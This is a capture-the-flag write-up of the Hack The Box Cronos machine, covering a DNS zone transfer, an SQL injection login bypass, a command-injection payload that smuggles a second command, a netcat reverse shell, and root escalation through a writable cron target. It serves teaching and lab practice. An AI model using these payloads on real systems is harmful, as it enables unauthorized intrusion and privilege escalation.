# Hack The Box - Cronos Writeup

> A complete walkthrough of the **Cronos** machine from Hack The Box, covering network enumeration, DNS zone transfer, subdomain discovery, SQL injection authentication bypass, command injection, and cron job privilege escalation.

---

## Machine Information

| Platform     | Machine | Difficulty | OS    |
| ------------ | ------- | ---------- | ----- |
| Hack The Box | Cronos  | Medium     | Linux |

---

# 📌 Overview

**Cronos** is a Linux-based Hack The Box machine that demonstrates how multiple small weaknesses can be chained together to achieve complete system compromise.

The attack path involves several important penetration testing techniques:

* Network enumeration
* DNS enumeration
* DNS zone transfer
* Subdomain discovery
* SQL injection authentication bypass
* OS command injection
* Reverse shell access
* Database credential enumeration
* Cron job analysis
* Writable scheduled task abuse
* Root privilege escalation

The machine is a good example of why every exposed service should be thoroughly enumerated, especially services such as DNS that are often overlooked.

---

# 🗂️ Table of Contents

* [Reconnaissance](#-reconnaissance)
* [Service Enumeration](#-service-enumeration)
* [Web Enumeration](#-web-enumeration)
* [DNS Enumeration](#-dns-enumeration)
* [Zone Transfer](#-zone-transfer)
* [Subdomain Discovery](#-subdomain-discovery)
* [SQL Injection](#-sql-injection)
* [Command Injection](#-command-injection)
* [Initial Access](#-initial-access)
* [Post Exploitation Enumeration](#-post-exploitation-enumeration)
* [User Flag](#-user-flag)
* [Privilege Escalation](#-privilege-escalation)
* [Cron Job Abuse](#-cron-job-abuse)
* [Root Access](#-root-access)
* [Attack Path Summary](#-attack-path-summary)
* [Key Takeaways](#-key-takeaways)

---

# 🔍 Reconnaissance

The target IP address provided was:

```text
10.129.227.211
```

---

## Full Port Scan

Starting with an Nmap scan to identify all open ports.

```bash
nmap -p- --min-rate 5000 10.129.227.211
```

### Result

```text
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

Three ports were discovered:

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 53   | DNS     |
| 80   | HTTP    |

An all-port scan was also kept running in the background while continuing service enumeration.

---

# 🔎 Service Enumeration

A detailed version and default script scan was performed.

```bash
nmap -sC -sV -p22,53,80 10.129.227.211
```

### Results

```text
22/tcp open  ssh
OpenSSH 7.2p2 Ubuntu

53/tcp open  domain
ISC BIND 9.10.3-P4

80/tcp open  http
Apache httpd 2.4.18 (Ubuntu)
```

The HTTP service identified the website title as:

```text
Cronos
```

The service information confirmed the target was running Linux.

---

# 🌐 Adding the Domain

The target domain was added to the local `/etc/hosts` file.

```bash
sudo nano /etc/hosts
```

Entry:

```text
10.129.227.211 cronos.htb
```

The website could now be accessed using:

```text
http://cronos.htb
```

---

# 📂 Web Enumeration

Directory enumeration was performed using Feroxbuster.

Initial results revealed mostly static directories:

```text
/css
/js
```

Further enumeration revealed two interesting files:

```text
/robots.txt
/web.config
```

---

## Interesting `web.config`

The `web.config` file contained rewrite rules.

```xml
<configuration>
  <system.webServer>
    <rewrite>
      <rules>

        <rule name="Imported Rule 1" stopProcessing="true">
          <match url="^(.*)/$" ignoreCase="false" />

          <conditions>
            <add input="{REQUEST_FILENAME}"
                 matchType="IsDirectory"
                 ignoreCase="false"
                 negate="true" />
          </conditions>

          <action type="Redirect"
                  redirectType="Permanent"
                  url="/{R:1}" />
        </rule>

        <rule name="Imported Rule 2" stopProcessing="true">

          <match url="^" ignoreCase="false" />

          <conditions>

            <add input="{REQUEST_FILENAME}"
                 matchType="IsDirectory"
                 ignoreCase="false"
                 negate="true" />

            <add input="{REQUEST_FILENAME}"
                 matchType="IsFile"
                 ignoreCase="false"
                 negate="true" />

          </conditions>

          <action type="Rewrite" url="index.php" />

        </rule>

      </rules>
    </rewrite>
  </system.webServer>
</configuration>
```

Although the file did not directly expose a vulnerability, the presence of port `53` provided another promising attack surface.

---

# 🌐 DNS Enumeration

The machine exposed a DNS service running ISC BIND.

Instead of focusing only on the web server, DNS enumeration was performed.

A zone transfer attempt was made using:

```bash
dig axfr @10.129.227.211 cronos.htb
```

---

# 💥 Zone Transfer

The DNS zone transfer was successful.

```text
cronos.htb.
ns1.cronos.htb.
admin.cronos.htb.
www.cronos.htb.
```

The most interesting discovery was:

```text
admin.cronos.htb
```

This subdomain was not initially visible during normal web enumeration.

---

# 🔍 Subdomain Discovery

The newly discovered subdomain was added to `/etc/hosts`.

```text
10.129.227.211 admin.cronos.htb
```

Navigating to:

```text
http://admin.cronos.htb
```

revealed an administrative login page.

---

# 💉 SQL Injection

The login form was tested for SQL injection vulnerabilities.

The following payload was used:

```text
admin'-- -
```

The authentication was successfully bypassed.

After bypassing the login mechanism, access was obtained to:

```text
NetTool v0.1
```

---

# 🖥️ NetTool Enumeration

The administrative panel provided functionality for network diagnostics.

Available options included:

* Ping
* Traceroute

The application accepted a host parameter.

This immediately became a potential candidate for OS command injection.

---

# 💥 Command Injection

The following payload was tested:

```text
command=traceroute&host=8.8.8.8;id
```

The application returned:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed that arbitrary operating system commands could be executed.

The vulnerable application was executing commands as:

```text
www-data
```

---

# 🐚 Initial Access

After confirming command injection, a reverse shell was executed.

A Netcat listener was started:

```bash
nc -lvnp 4444
```

A reverse shell was triggered through the vulnerable NetTool functionality.

The connection was successfully received:

```text
Connection received on 10.129.227.211
```

Checking the current user:

```bash
id
```

The shell was running as:

```text
uid=33(www-data) gid=33(www-data)
```

We successfully obtained initial access as:

```text
www-data
```

---

# 🔧 Shell Stabilization

Python was available on the target.

```bash
which python3
```

Output:

```text
/usr/bin/python3
```

A PTY shell was spawned:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```text
CTRL + Z
```

Configure the terminal:

```bash
stty raw -echo
fg
```

Then configure the environment:

```bash
export SHELL=bash
export TERM=xterm-256color
```

The shell was now more stable for further enumeration.

---

# 🔎 Post Exploitation Enumeration

The application directory contained an interesting configuration file.

```bash
cat config.php
```

Output:

```php
<?php

define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'admin');
define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
define('DB_DATABASE', 'admin');

$db = mysqli_connect(
    DB_SERVER,
    DB_USERNAME,
    DB_PASSWORD,
    DB_DATABASE
);

?>
```

Database credentials were exposed inside the application's source code.

---

# 🗄️ Database Enumeration

Checking listening services:

```bash
ss -tunlp
```

Output showed MySQL listening locally:

```text
127.0.0.1:3306
```

Using the discovered credentials, the database was enumerated.

```sql
select * from users;
```

Output:

```text
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
```

Although this did not immediately provide additional system access, it demonstrated the importance of checking configuration files after gaining initial access.

---

# 🚩 User Flag

During filesystem enumeration, the user directory was identified.

```bash
ls -lah /home/noulis
```

Contents included:

```text
user.txt
```

The user flag could then be read:

```bash
cat /home/noulis/user.txt
```

---

# ⬆️ Privilege Escalation

The next phase was privilege escalation.

System-wide cron jobs were inspected.

```bash
cat /etc/crontab
```

The following interesting entry was discovered:

```text
* * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

This command was being executed:

* Every minute
* As the `root` user
* Using PHP
* Through the Laravel `artisan` file

The target file was:

```text
/var/www/laravel/artisan
```

---

# ⏰ Cron Job Abuse

Further permission analysis revealed that the scheduled `artisan` file could be modified from the compromised context.

Since the cron job executed the file as root every minute, modifying it provided a direct privilege escalation path.

A PHP reverse shell was created and placed in the scheduled execution path.

The existing `artisan` file was replaced with the malicious PHP payload.

A listener was started:

```bash
nc -lvnp 4444
```

After waiting for the cron job to execute, a new connection was received.

---

# 👑 Root Access

The incoming shell was checked:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

We successfully escalated privileges to:

```text
root
```

The root flag could now be accessed:

```bash
cat /root/root.txt
```

The machine was fully compromised.

---

# 🗺️ Attack Path Summary

```text
┌──────────────────────────────┐
│         Nmap Scan            │
│                              │
│ 22 - SSH                     │
│ 53 - DNS                     │
│ 80 - HTTP                    │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      DNS Enumeration         │
│                              │
│ Zone Transfer                │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│   Discover admin.cronos.htb  │
│                              │
│ Administrative Login Panel   │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       SQL Injection          │
│                              │
│ Authentication Bypass        │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       NetTool v0.1           │
│                              │
│ Ping / Traceroute            │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Command Injection       │
│                              │
│ Arbitrary Command Execution  │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       Shell as www-data      │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Cron Job Enumeration    │
│                              │
│ Root executes Laravel        │
│ artisan every minute         │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Writable Script Abuse   │
│                              │
│ Root Reverse Shell           │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│          ROOT ACCESS         │
│                              │
│ user.txt + root.txt          │
└──────────────────────────────┘
```

---

# 🔗 Complete Attack Chain

```text
Nmap
 │
 ├── SSH
 │
 ├── HTTP
 │
 └── DNS
       │
       ▼
DNS Zone Transfer
       │
       ▼
admin.cronos.htb
       │
       ▼
SQL Injection
       │
       ▼
Authentication Bypass
       │
       ▼
NetTool
       │
       ▼
Command Injection
       │
       ▼
www-data Shell
       │
       ▼
Cron Job Enumeration
       │
       ▼
Writable Laravel Artisan
       │
       ▼
Root Cron Execution
       │
       ▼
ROOT
```

---

# 🧠 Key Takeaways

## 🔹 Never Ignore DNS

Port `53` was one of the most important services on the machine.

A successful DNS zone transfer revealed:

```text
admin.cronos.htb
```

Without enumerating DNS, this attack surface could have easily been missed.

Always test for:

```bash
dig axfr @TARGET DOMAIN
```

when DNS services are exposed.

---

## 🔹 Subdomains Can Hide Critical Functionality

The main website did not initially reveal the administrative application.

The vulnerable functionality was discovered only after DNS enumeration revealed:

```text
admin.cronos.htb
```

Subdomain enumeration should always be part of web application testing.

---

## 🔹 Input Validation Is Critical

The NetTool application allowed attacker-controlled input to reach system commands.

This resulted in:

```text
User Input
     │
     ▼
System Command
     │
     ▼
Command Injection
     │
     ▼
Remote Code Execution
```

Applications should never directly pass user-controlled input to shell commands.

---

## 🔹 Post-Exploitation Enumeration Matters

Initial access as `www-data` was only the beginning.

Further enumeration revealed:

* Database credentials
* Local MySQL service
* User directories
* Scheduled tasks
* A root-owned cron job

Post-exploitation enumeration is just as important as gaining the initial foothold.

---

## 🔹 Always Inspect Cron Jobs

The following command was critical:

```bash
cat /etc/crontab
```

This revealed a root cron job running every minute:

```text
* * * * * root php /var/www/laravel/artisan schedule:run
```

When analyzing cron jobs, always investigate:

* Who executes the command
* How frequently it runs
* Whether the executed file is writable
* Whether the directory permissions are insecure
* Whether relative paths are used

---

# 🛠️ Tools Used

```text
Nmap
Feroxbuster
Dig
Burp Suite
SQL Injection
Netcat
Python
MySQL Client
Linux Enumeration Commands
```

---

# 📚 Vulnerabilities and Misconfigurations

| Finding              | Component       | Impact                    |
| -------------------- | --------------- | ------------------------- |
| DNS Zone Transfer    | BIND DNS        | Subdomain Disclosure      |
| SQL Injection        | Admin Login     | Authentication Bypass     |
| Command Injection    | NetTool         | Remote Code Execution     |
| Exposed Credentials  | config.php      | Database Access           |
| Writable Cron Target | Laravel Artisan | Root Privilege Escalation |

---

# 🎯 Lessons Learned

Cronos demonstrates how a full compromise can result from chaining multiple vulnerabilities together.

Individually, each issue may seem limited:

```text
DNS Misconfiguration
        +
SQL Injection
        +
Command Injection
        +
Writable Scheduled Script
        =
Complete System Compromise
```

The machine strongly reinforces several penetration testing principles:

1. Enumerate every exposed service.
2. Do not focus only on HTTP and SSH.
3. Always investigate DNS.
4. Search for hidden subdomains.
5. Test web application inputs carefully.
6. Enumerate configuration files after initial access.
7. Always inspect cron jobs during privilege escalation.
8. Verify permissions on every script executed by privileged users.

---

# 🏁 Final Notes

Hack The Box **Cronos** is an excellent example of attack chaining.

The complete compromise required moving through several different attack surfaces:

```text
Network Enumeration
        ↓
DNS Zone Transfer
        ↓
Subdomain Discovery
        ↓
SQL Injection
        ↓
Command Injection
        ↓
Initial Shell
        ↓
Cron Job Enumeration
        ↓
Privilege Escalation
        ↓
ROOT
```

The most important lesson from this machine is:

> **Never stop at the obvious attack surface. A service that initially appears unrelated may contain the key to the next stage of compromise.**

---

## ⚠️ Disclaimer

This writeup is created strictly for educational purposes and documents techniques performed against the intentionally vulnerable **Hack The Box Cronos** machine in an authorized laboratory environment.

Do not attempt these techniques against systems without explicit authorization.

---

<p align="center">
  <b>Happy Hacking!</b>
</p>
